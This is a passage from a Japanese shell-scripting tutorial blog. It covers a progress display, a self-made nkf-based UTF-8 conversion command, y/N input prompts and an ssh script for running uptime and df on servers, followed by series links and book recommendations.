処理のループ最大数が150回であれば、以下の通りに修正します。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nb>set</span> count<span class=p>;</span>
<span class=nv>MAX</span><span class=o>=</span>150<span class=p>;</span>
</code></pre></div><p>forやwhileループ処理の中に以下を埋め込みます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>progress <span class=s2>&#34;</span><span class=nv>$#</span><span class=s2>&#34;</span> <span class=s2>&#34;</span><span class=nv>$MAX</span><span class=s2>&#34;</span><span class=p>;</span> <span class=nb>set</span> - <span class=s2>&#34;</span><span class=nv>$@</span><span class=s2>&#34;</span> count <span class=p>;</span>
</code></pre></div><p>最後にforまたはwhileループを抜けた後に</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nb>echo</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
</code></pre></div><p>を追加します。これだけです。</p>
<h3 id=実行結果>実行結果</h3>
<p><figure class=gallery-image style=flex-grow:160;flex-basis:384px>
<a href=https://suzukiiichiro.github.io/posts/2023-02-01-01-oneliner-suzuki/progress.gif data-size=640x400>
<img src=https://suzukiiichiro.github.io/posts/2023-02-01-01-oneliner-suzuki/progress.gif width=640 height=400 loading=lazy alt=シェルスクリプト１０００本ノックの画像>
</a>
</a>
</figure></p>
<h2 id=自作コマンド一時ファイルを作ることなくファイルの文字コードと改行コードをutf-８に変換するスクリプト>【自作コマンド】一時ファイルを作ることなく、ファイルの文字コードと改行コードをUTF-８に変換するスクリプト。</h2>
<h3 id=必要なもの>必要なもの</h3>
<p>ネットワーク漢字フィルター nkf<br>
※macの場合、<a class=link href=https://brew.sh/index_ja title=Homebrew target=_blank rel=noopener>Homebrew</a> が必要になります。</p>
<h3 id=nkf-インストールの手順>nkf インストールの手順</h3>
<p>まず、nkfがインストールされているかを確認します。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ which nkf 
/usr/local/bin/nkf
</code></pre></div><p>インストールされていない場合、macの場合はbrewでインストールします。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ brew install nkf 
</code></pre></div><p>インストールしようとすると以下のエラーが出ることがあります</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>Error: The <span class=sb>`</span>brew link<span class=sb>`</span> step did not <span class=nb>complete</span> successfully
The formula built, but is not symlinked into /usr/local
Could not symlink share/man/ja/man1/nkf.1
/usr/local/share/man/ja/man1 is not writable.

</code></pre></div><p>権限周りを下記のコマンドを打って変更します。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sudo chmod <span class=m>775</span> /usr/local/share/man/ja/man1
sudo chown &lt;ユーザ名&gt;:admin /usr/local/share/man/ja/man1
</code></pre></div><p>コマンドを確認します。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ nkf -v
Network Kanji Filter Version 2.1.5 <span class=o>(</span>2018-12-15<span class=o>)</span>
Copyright <span class=o>(</span>C<span class=o>)</span> 1987, FUJITSU LTD. <span class=o>(</span>I.Ichikawa<span class=o>)</span>.
Copyright <span class=o>(</span>C<span class=o>)</span> 1996-2018, The nkf Project.
</code></pre></div><h3 id=使い方-4>使い方</h3>
<p>nkfコマンドとは？<br>
「nkf」は「Network Kanji Filter」の略で、LinuxとWindowsなど、異なるOS間でテキストデータを交換する際に問題となる文字コードと改行コードを変換するためのコマンドです。</p>
<p>nkfコマンドの書式<br>
nkf オプション ファイル名</p>
<p>UTF-8に変換する場合は、オプションに wLu をつけて変換します。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ nkf -wLu isofile.txt &gt; utf8.txt
</code></pre></div><h3 id=変換の流れ手動編>変換の流れ（手動編）</h3>
<p>元ファイル moto.txt (UTF-8以外のファイルエンコード、改行コード）<br>
↓<br>
変換後のファイル ato.txt(UTF-8に変換したファイル）<br>
↓<br>
変換後のファイルをリネームする</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=c1># UTF-8に変換</span>
$ nkf -wLu moto.txt &gt; ato.txt

<span class=c1># 変換後のファイルを元のファイル名にリネームする</span>
$ mv ato.txt moto.txt

<span class=c1># vimiでファイルエンコードを確認する</span>
$ vim moto.txt
</code></pre></div><p>面倒ですね。ここで、一発でUTF-8に変換するコマンドを作成してみます。</p>
<h3 id=変換の流れ自動編>変換の流れ（自動編）</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=c1># UTF-8に変換 wLu コマンドをこれから自作</span>
<span class=c1># その後・・・</span>

$ wLu moto.txt ← 一時ファイルすら作る必要なし
$ vim moto.txt ← UTF-8 に変換されている！
</code></pre></div><h3 id=コマンドの内容>コマンドの内容</h3>
<p>まずファイルを作ります。ファイル名は wLu とします</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=c1># wLu というファイルを作成</span>
$ :&gt; wLu

<span class=c1># vim で wLu を開く</span>
$ vim wLu 
</code></pre></div><p>以下の内容をファイルに貼り付ける</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=cp>#!/bin/bash
</span><span class=cp></span>
<span class=c1>#################################################</span>
<span class=c1># パラメータで渡されたファイル名をutf8に変換する</span>
<span class=c1>#</span>
<span class=c1># 使い方</span>
<span class=c1># wLu UTF-8に変換したいファイル名</span>
<span class=c1># wLu を /usr/local/bin/にコピーすると</span>
<span class=c1># 通常のコマンドとして本実行ファイルを利用する事が出来ます。</span>
<span class=c1>#</span>
<span class=c1>#################################################</span>
<span class=c1>#</span>
<span class=nv>filename</span><span class=o>=</span><span class=s2>&#34;</span><span class=nv>$1</span><span class=s2>&#34;</span> <span class=p>;</span>
<span class=c1>#</span>
<span class=k>function</span> wLu<span class=o>(){</span>
  <span class=k>if</span> <span class=o>[</span> -f <span class=s2>&#34;</span><span class=nv>$filename</span><span class=s2>&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
    cat <span class=s2>&#34;</span><span class=nv>$filename</span><span class=s2>&#34;</span> <span class=p>|</span> nkf -wLu &gt; <span class=s2>&#34;</span><span class=nv>$filename</span><span class=s2>&#34;</span>.u <span class=p>;</span>
    mv <span class=s2>&#34;</span><span class=nv>$filename</span><span class=s2>&#34;</span>.u <span class=s2>&#34;</span><span class=nv>$filename</span><span class=s2>&#34;</span> <span class=p>;</span>
  <span class=k>fi</span>
<span class=o>}</span>
<span class=c1>#</span>
<span class=k>if</span> ! which nkf &gt;/dev/null 2&gt;<span class=p>&amp;</span>1<span class=p>;</span> <span class=k>then</span>
  <span class=nb>echo</span> <span class=s2>&#34;nkf がありません&#34;</span> <span class=p>;</span>
  <span class=nb>echo</span> <span class=s2>&#34;nkf をインストールして下さい&#34;</span> <span class=p>;</span> 
  <span class=nb>exit</span> <span class=p>;</span>
<span class=k>fi</span>
<span class=c1>#</span>
<span class=k>if</span> <span class=o>[</span> -z <span class=s2>&#34;</span><span class=nv>$filename</span><span class=s2>&#34;</span> <span class=o>]</span> <span class=p>;</span> <span class=k>then</span>
  <span class=nb>echo</span> <span class=s2>&#34;第一引数にファイル名を指定して下さい&#34;</span>
  <span class=nb>echo</span> <span class=s2>&#34;実行例： wLu filename&#34;</span> <span class=p>;</span>  
  <span class=nb>exit</span> <span class=p>;</span>
<span class=k>fi</span>
<span class=c1># 実行</span>
wLu <span class=p>;</span>
<span class=c1># 終了</span>
<span class=nb>exit</span> <span class=p>;</span>
</code></pre></div><p>作成したファイルには日本語が含まれているため、wLuファイルを UTF-8に変換しておきます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=c1># wLu ファイルをnkf -wLu でUTF-8に変換</span>
$ nkf -wLu wLu &gt; wLu.txt

<span class=c1># wLu.txtをwLuにリネームします</span>
$ mv wLu.txt wLu

<span class=c1># 作成したwLuコマンドファイルを/usr/local/bin にコピーします</span>
$ sudo wLu /usr/local/bin/

<span class=c1># コマンドが配置されたかを確認</span>
$ which wLu
$ /usr/local/bin/wLu
</code></pre></div><h3 id=使い方-5>使い方</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=c1># UTF-8以外のファイルエンコードファイル</span>
$ cat moto.txt
$ wLu moto.txt
</code></pre></div><p>変換結果を一時ファイルにし、リネームする手間が省けます。<br>
便利ですね。</p>
<h2 id=自作bashシェルスクリプトでキー入力待ちプロンプトを実装する>【自作】BASHシェルスクリプトで「キー入力待ち」プロンプトを実装する</h2>
<p>説明も何もよくみるあれです。</p>
<pre tabindex=0><code>実行しますか？ （y or N):
</code></pre><h3 id=何かを押せば処理を続けたい場合>何かを押せば処理を続けたい場合</h3>
<p>キーボードの入力さえあれば次に進むパターンもおなじみですね。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nb>read</span> -p <span class=s2>&#34;なにかキーを押してください&#34;</span>
</code></pre></div><h3 id=yを押せば処理を続けnでabort終了したい場合>yを押せば処理を続け、Nでabort（終了）したい場合</h3>
<p>これは覚えておくなりメモしておいたほうが良さそうです。<br>
yを押せば次に進むし、Nであれば処理はabortします。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nb>read</span> -p <span class=s2>&#34;ok? (y/N): &#34;</span> yn
<span class=k>case</span> <span class=s2>&#34;</span><span class=nv>$yn</span><span class=s2>&#34;</span> in <span class=o>[</span>yY<span class=o>]</span>*<span class=o>)</span> <span class=p>;;</span> *<span class=o>)</span> <span class=nb>echo</span> <span class=s2>&#34;abort.&#34;</span> <span class=p>;</span> <span class=nb>exit</span> <span class=p>;;</span> <span class=k>esac</span>
</code></pre></div><h2 id=自作コマンドsshでサーバーにログインしてコマンドを実行後自動的にログアウトしてローカルに戻ってくる方法>【自作コマンド】sshでサーバーにログインしてコマンドを実行後、自動的にログアウトしてローカルに戻ってくる方法</h2>
<p>sshでサーバーにログインして、なんらかのコマンドを実行しターミナルに表示、ミッション終了後、ターミナルを自動的にログアウトしてローカルに何事もなかったかのようにもどってくる最も簡単な方法ってなにかないでしょうか。</p>
<h3 id=イメージ>イメージ</h3>
<p>従来の方法</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>ローカルＰＣのターミナル

↓ Linuxサーバーにログイン

<span class=nv>$df</span> <span class=nv>$uptime</span> などを実行

↓ Linuxサーバーをログアウト

ローカルＰＣにもどる
</code></pre></div><p>これからつくるBash/ssh</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>ローカルＰＣのターミナル
↓ 
Linuxサーバーにログイン 
<span class=nv>$df</span> <span class=nv>$uptime</span> などを実行 
Linuxサーバーをログアウト
↓ 
ローカルＰＣのターミナルにもどる
</code></pre></div><p>わかりにくいですか？<br>
まず、メリットとしてサーバーでコマンドからログアウトする必要がありません。<br>
これができれば、一台一台サーバーのヘルスチェックをせずとも、数十台のサーバーを<br>
順番に訪ね歩きファイルに出力する事も可能です。</p>
<p>以下、ソースです。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=cp>#!/usr/bin/bash
</span><span class=cp></span>
<span class=c1>##############################################</span>
<span class=c1># sshでサーバーにログインして、なんらかのコマンドを</span>
<span class=c1># 実行しターミナルに表示、ミッション終了後、ターミ</span>
<span class=c1># ナルを自動的にログアウトしてローカルに何事もなか</span>
<span class=c1># ったかのようにもどってくる最も簡単シェルスクリプト</span>
<span class=c1>##############################################</span>
<span class=c1>#</span>
<span class=c1># サーバーのＩＰアドレスとか</span>
<span class=nv>SERVER</span><span class=o>=</span><span class=s2>&#34;centos@xx.xx.xx.xxx&#34;</span>
<span class=c1># 実行したいコマンドを &amp;&amp; でつなぐ</span>
<span class=nv>COMMAND</span><span class=o>=</span><span class=s2>&#34;uptime &amp;&amp; df -h&#34;</span><span class=p>;</span>

<span class=nb>echo</span> <span class=s2>&#34;centosサーバーログイン&#34;</span><span class=p>;</span> 

<span class=c1># ポイントは -t です。</span>
ssh <span class=nv>$SERVER</span>  -t <span class=nv>$COMMAND</span><span class=p>;</span> 

<span class=nb>echo</span> <span class=s2>&#34;centosサーバーログアウト&#34;</span><span class=p>;</span>

exit<span class=p>;</span>
</code></pre></div><p>たったこれだけですが、この工夫により多くのサーバーを<br>
スクリプトで一括回遊することができます。 お試しあれ。</p>
<h2 id=自作コマンドシェルスクリプトでキー入力待ちプロンプトを実装する>【自作コマンド】シェルスクリプトで「キー入力待ち」プロンプトを実装する</h2>
<p>説明も何もよくみるあれです。</p>
<pre tabindex=0><code>実行しますか？ （y or N):
</code></pre><h3 id=何かを押せば処理を続けたい場合-1>何かを押せば処理を続けたい場合</h3>
<p>キーボードの入力さえあれば次に進むパターンもおなじみですね。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nb>read</span> -p <span class=s2>&#34;なにかキーを押してください&#34;</span>
</code></pre></div><h3 id=yを押せば処理を続けnでabort終了したい場合-1>yを押せば処理を続け、Nでabort（終了）したい場合</h3>
<p>これは覚えておくなりメモしておいたほうが良さそうです。<br>
yを押せば次に進むし、Nであれば処理はabortします。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nb>read</span> -p <span class=s2>&#34;ok? (y/N): &#34;</span> yn
<span class=k>case</span> <span class=s2>&#34;</span><span class=nv>$yn</span><span class=s2>&#34;</span> in <span class=o>[</span>yY<span class=o>]</span>*<span class=o>)</span> <span class=p>;;</span> *<span class=o>)</span> <span class=nb>echo</span> <span class=s2>&#34;abort.&#34;</span> <span class=p>;</span> <span class=nb>exit</span> <span class=p>;;</span> <span class=k>esac</span>
</code></pre></div><h2 id=ざっくりシリーズのご紹介>「ざっくり」シリーズのご紹介</h2>
<p>【ちょいと便利な】シェルスクリプトワンライナー特集２【一行完結】<br>
<a class=link href=https://suzukiiichiro.github.io/posts/2023-01-11-01-oneliner-suzuki/ target=_blank rel=noopener>https://suzukiiichiro.github.io/posts/2023-01-11-01-oneliner-suzuki/</a><br>
【ちょいと便利な】シェルスクリプトワンライナー特集【一行完結】<br>
<a class=link href=https://suzukiiichiro.github.io/posts/2022-11-30-01-oneliner-suzuki/ target=_blank rel=noopener>https://suzukiiichiro.github.io/posts/2022-11-30-01-oneliner-suzuki/</a></p>
<p>【TIPS】ざっくりわかるシェルスクリプト<br>
<a class=link href=https://suzukiiichiro.github.io/posts/2022-09-26-01-tips-suzuki/ target=_blank rel=noopener>https://suzukiiichiro.github.io/posts/2022-09-26-01-tips-suzuki/</a><br>
【ターミナルTIPS】ターミナルで知っておくとちょっとだけ便利なコマンド<br>
<a class=link href=https://suzukiiichiro.github.io/posts/2022-11-28-01-terminaltips-suzuki/ target=_blank rel=noopener>https://suzukiiichiro.github.io/posts/2022-11-28-01-terminaltips-suzuki/</a></p>
<p>【名著紹介】「ＵＮＩＸという考え方」ご紹介<br>
<a class=link href=https://suzukiiichiro.github.io/posts/2022-11-07-01-theideaofunix-suzuki/ target=_blank rel=noopener>https://suzukiiichiro.github.io/posts/2022-11-07-01-theideaofunix-suzuki/</a></p>
<p>【アルゴリズム ソート比較】ざっくりわかるシェルスクリプト２０<br>
<a class=link href=https://suzukiiichiro.github.io/posts/2022-11-02-01-sortcomp-suzuki/ target=_blank rel=noopener>https://suzukiiichiro.github.io/posts/2022-11-02-01-sortcomp-suzuki/</a><br>
【アルゴリズム クイックソート】ざっくりわかるシェルスクリプト１９<br>
<a class=link href=https://suzukiiichiro.github.io/posts/2022-11-01-01-quicksort-suzuki/ target=_blank rel=noopener>https://suzukiiichiro.github.io/posts/2022-11-01-01-quicksort-suzuki/</a><br>
【アルゴリズム シェルソート】ざっくりわかるシェルスクリプト１８<br>
<a class=link href=https://suzukiiichiro.github.io/posts/2022-10-27-01-shellsort-suzuki/ target=_blank rel=noopener>https://suzukiiichiro.github.io/posts/2022-10-27-01-shellsort-suzuki/</a><br>
【アルゴリズム マージソート】ざっくりわかるシェルスクリプト１７<br>
<a class=link href=https://suzukiiichiro.github.io/posts/2022-10-19-01-mergesort-suzuki/ target=_blank rel=noopener>https://suzukiiichiro.github.io/posts/2022-10-19-01-mergesort-suzuki/</a><br>
【アルゴリズム 連結リスト】ざっくりわかるシェルスクリプト１６<br>
<a class=link href=https://suzukiiichiro.github.io/posts/2022-10-18-01-list-suzuki/ target=_blank rel=noopener>https://suzukiiichiro.github.io/posts/2022-10-18-01-list-suzuki/</a><br>
【アルゴリズム 再帰】ざっくりわかるシェルスクリプト１５<br>
<a class=link href=https://suzukiiichiro.github.io/posts/2022-10-07-01-algorithm-recursion-suzuki/ target=_blank rel=noopener>https://suzukiiichiro.github.io/posts/2022-10-07-01-algorithm-recursion-suzuki/</a><br>
【アルゴリズム キュー】ざっくりわかるシェルスクリプト１４<br>
<a class=link href=https://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-queue-suzuki/ target=_blank rel=noopener>https://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-queue-suzuki/</a><br>
【アルゴリズム スタック】ざっくりわかるシェルスクリプト１３<br>
<a class=link href=https://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-stack-suzuki/ target=_blank rel=noopener>https://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-stack-suzuki/</a><br>
【アルゴリズム 挿入ソート】ざっくりわかるシェルスクリプト１２<br>
<a class=link href=https://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-insertionsort-suzuki/ target=_blank rel=noopener>https://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-insertionsort-suzuki/</a><br>
【アルゴリズム 選択ソート】ざっくりわかるシェルスクリプト１１<br>
<a class=link href=https://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-selectionsort-suzuki/ target=_blank rel=noopener>https://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-selectionsort-suzuki/</a><br>
【アルゴリズム バブルソート】ざっくりわかるシェルスクリプト１０<br>
<a class=link href=https://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-bubblesort-suzuki/ target=_blank rel=noopener>https://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-bubblesort-suzuki/</a><br>
【アルゴリズム ビッグオー】ざっくりわかるシェルスクリプト９<br>
<a class=link href=https://suzukiiichiro.github.io/posts/2022-10-04-01-algorithm-bigo-suzuki/ target=_blank rel=noopener>https://suzukiiichiro.github.io/posts/2022-10-04-01-algorithm-bigo-suzuki/</a><br>
【アルゴリズム ２次元配列編】ざっくりわかるシェルスクリプト８<br>
<a class=link href=https://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-eval-array-suzuki/ target=_blank rel=noopener>https://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-eval-array-suzuki/</a><br>
【アルゴリズム 配列準備編】ざっくりわかるシェルスクリプト７<br>
<a class=link href=https://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-array-suzuki/ target=_blank rel=noopener>https://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-array-suzuki/</a><br>
【アルゴリズム 配列編】ざっくりわかるシェルスクリプト６<br>
<a class=link href=https://suzukiiichiro.github.io/posts/2022-09-27-01-array-suzuki/ target=_blank rel=noopener>https://suzukiiichiro.github.io/posts/2022-09-27-01-array-suzuki/</a><br>
【grep/sed/awkも】ざっくりわかるシェルスクリプト５<br>
<a class=link href=https://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/ target=_blank rel=noopener>https://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/</a><br>
【grep特集】ざっくりわかるシェルスクリプト４<br>
<a class=link href=https://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/ target=_blank rel=noopener>https://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/</a><br>
【はじめから】ざっくりわかるシェルスクリプト３<br>
<a class=link href=https://suzukiiichiro.github.io/posts/2022-01-13-01-suzuki/ target=_blank rel=noopener>https://suzukiiichiro.github.io/posts/2022-01-13-01-suzuki/</a><br>
【はじめから】ざっくりわかるシェルスクリプト２<br>
<a class=link href=https://suzukiiichiro.github.io/posts/2022-01-12-01-suzuki/ target=_blank rel=noopener>https://suzukiiichiro.github.io/posts/2022-01-12-01-suzuki/</a><br>
【はじめから】ざっくりわかるシェルスクリプト１<br>
<a class=link href=https://suzukiiichiro.github.io/posts/2022-01-07-01-suzuki/ target=_blank rel=noopener>https://suzukiiichiro.github.io/posts/2022-01-07-01-suzuki/</a></p>
<h2 id=書籍の紹介>書籍の紹介</h2>
<aside class=amazon-box>
<a href="https://www.amazon.co.jp/gp/proteect/4873112672/ref=as_li_tl?ie=UTF8&camp=247&creative=1211&creativeASIN=4873112672&linkCode=as2&tag=nlpqueens09-22&linkId=ef087fd92d3628bb94e1eb10cb202d43" target=_blank>
<div class="columns amazon-image">
<img border=0 src=https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg alt="詳解 シェルスクリプト 大型本  2006/1/16">
</div>
<div class="columns amazon-info">
<h2 class=amazon-name>詳解 シェルスクリプト 大型本 2006/1/16</h2>
<p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
</p>
<span class=link>Amazonで詳細を見る</span>
</div>
</a>
<small>Amazon.co.jpアソシエイトを使用</small>
</aside>
<aside class=amazon-box>
<a href="https://www.amazon.co.jp/gp/proteect/4797377623/ref=as_li_tl?ie=UTF8&camp=247&creative=1211&creativeASIN=4797377623&linkCode=as2&tag=nlpqueens09-22&linkId=3c8d4566263ae99374221c4f8f469154" target=_blank>
<div class="columns amazon-image">
<img border=0 src=https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg alt="UNIXシェルスクリプト マスターピース132">
</div>
<div class="columns amazon-info">
<h2 class=amazon-name>UNIXシェルスクリプト マスターピース132</h2>
<p>すべてのUNIXエンジニア必携!!
<p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。<br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。</p>
</p>
<span class=link>Amazonで詳細を見る</span>
</div>
</a>
<small>Amazon.co.jpアソシエイトを使用</small>
</aside>
<aside class=amazon-box>
<a href="https://www.amazon.co.jp/gp/proteect/4774186945/ref=as_li_tl?ie=UTF8&camp=247&creative=1211&creativeASIN=4774186945&linkCode=as2&tag=nlpqueens09-22&linkId=8ef3ff961c569212e910cf3d6e37dcb6" target=_blank>
<div class="columns amazon-image">
<img border=0 src=https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB+DB PRESS plus) 単行本（ソフトカバー）  2017/1/20">
</div>
<div class="columns amazon-info">
<h2 class=amazon-name>[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB+DB PRESS plus) 単行本（ソフトカバー） 2017/1/20</h2>
<p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。</p>
<span class=link>Amazonで詳細を見る</span>
</div>
</a>
<small>Amazon.co.jpアソシエイトを使用</small>
</aside>
<aside class=amazon-box>
<a href="https://www.amazon.co.jp/gp/proteect/4797393106/ref=as_li_tl?ie=UTF8&camp=247&creative=1211&creativeASIN=4797393106&linkCode=as2&tag=nlpqueens09-22&linkId=f514a6378c1c10e59ab16275745c2439" target=_blank>
<div class="columns amazon-image">
<img border=0 src=https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg alt="新しいシェルプログラミングの教科書 単行本">
</div>
<div class="columns amazon-info">
<h2 class=amazon-name>新しいシェルプログラミングの教科書 単行本</h2>
<p>エキスパートを目指せ!!
<p>システム管理やソフトウェア開発など、<br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説</p>
<p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、<br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。<br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。<br>
イマドキのエンジニア必携の一冊。</p>
<p>▼目次<br>
CHAPTER01 シェルってなんだろう<br>
CHAPTER02 シェルスクリプトとは何か<br>
CHAPTER03 シェルスクリプトの基本<br>
CHAPTER04 変数<br>
CHAPTER05 クォーティング<br>
CHAPTER06 制御構造<br>
CHAPTER07 リダイレクトとパイプ<br>
CHAPTER08 関数<br>
CHAPTER09 組み込みコマンド<br>
CHAPTER10 正規表現と文字列<br>
CHAPTER11 シェルスクリプトの実行方法<br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう<br>
CHAPTER13 シェルスクリプトの実用例<br>
CHAPTER14 テストとデバッグ<br>
CHAPTER15 読みやすいシェルスクリプト</p>
</p>
<span class=link>Amazonで詳細を見る</span>
</div>
</a>
<small>Amazon.co.jpアソシエイトを使用</small>
</aside>
</div>
<ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-8689199204567424 data-ad-slot=9341917836></ins>
<script>(adsbygoogle=window.adsbygoogle||[]).push({})</script>
<aside class="section related-contents--wrapper">
<h2 class=section-title>関連するコンテンツ</h2>
<div class=article-list>
<article class="has-image article-item" data-date=2023.01.11>
<a class=article-link href=https://suzukiiichiro.github.io/posts/2023-01-11-01-oneliner-suzuki/>
<header class=article-header>
<div class=article-image>
<picture class=picture>
<source srcset="https://suzukiiichiro.github.io/posts/2023-01-11-01-oneliner-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2023-01-11-01-oneliner-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_400x0_resize_q75_box.jpg 2x" media="(min-width: 769px)" width=200 height=254>
<img src=https://suzukiiichiro.github.io/posts/2023-01-11-01-oneliner-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg srcset="https://suzukiiichiro.github.io/posts/2023-01-11-01-oneliner-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2023-01-11-01-oneliner-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_400x0_resize_q75_box.jpg 2x" width=200 height=254 loading=lazy alt=【ちょいと便利な】シェルスクリプトワンライナー特集２【一行完結】>
</picture>
</div>
<div class=article-category>
<span class=article-category-item>
プログラミング
</span>
</div>
</header>
<div class=article-details>
<h2 class=article-title>【ちょいと便利な】シェルスクリプトワンライナー特集２【一行完結】</h2><div class=article-time>
<time class="article-time--item article-time--published">2023.01.11</time>
</div><p class=article-subtitle>ワンライナー ワンライナー（英：one liner）とは 華麗な職人技によって処理を1行に全部詰め込んだ「1行ですべてが完結しているプログラ…</p>
</div>
</a>
</article>
<article class="has-image article-item" data-date=2022.11.30>
<a class=article-link href=https://suzukiiichiro.github.io/posts/2022-11-30-01-oneliner-suzuki/>
<header class=article-header>
<div class=article-image>
<picture class=picture>
<source srcset="https://suzukiiichiro.github.io/posts/2022-11-30-01-oneliner-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-11-30-01-oneliner-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_400x0_resize_q75_box.jpg 2x" media="(min-width: 769px)" width=200 height=254>
<img src=https://suzukiiichiro.github.io/posts/2022-11-30-01-oneliner-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg srcset="https://suzukiiichiro.github.io/posts/2022-11-30-01-oneliner-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-11-30-01-oneliner-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_400x0_resize_q75_box.jpg 2x" width=200 height=254 loading=lazy alt=【ちょいと便利な】シェルスクリプトワンライナー特集【一行完結】>
</picture>
</div>
<div class=article-category>
<span class=article-category-item>
プログラミング
</span>
</div>
</header>
<div class=article-details>
<h2 class=article-title>【ちょいと便利な】シェルスクリプトワンライナー特集【一行完結】</h2><div class=article-time>
<time class="article-time--item article-time--published">2022.11.30</time>
</div><p class=article-subtitle>ワンライナー ワンライナー（英：one liner）とは 華麗な職人技によって処理を1行に全部詰め込んだ「1行ですべてが完結しているプログラ…</p>
</div>
</a>
</article>
